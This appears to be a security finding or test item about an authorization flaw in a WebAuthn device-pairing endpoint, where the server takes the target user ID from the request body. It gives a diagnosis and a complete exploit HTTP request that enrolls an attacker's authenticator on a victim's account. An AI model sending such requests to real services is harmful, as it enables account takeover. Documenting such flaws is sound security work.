diagnosis: The hybrid device pairing handler verifies JWT authentication, but extracts targetUserId from the client request body instead of req.user.id. An attacker can confirm a cross-device QR code pairing session and enroll their own smartphone authenticator into a target victim's account.
exploit_request:
POST /api/webauthn/hybrid/pair-device HTTP/1.1
Host: sso.vaultaccess.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"pairingSessionId": "pair_sess_891024", "targetUserId": "usr_victim_vp_finances", "devicePublicKey": "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE..."}
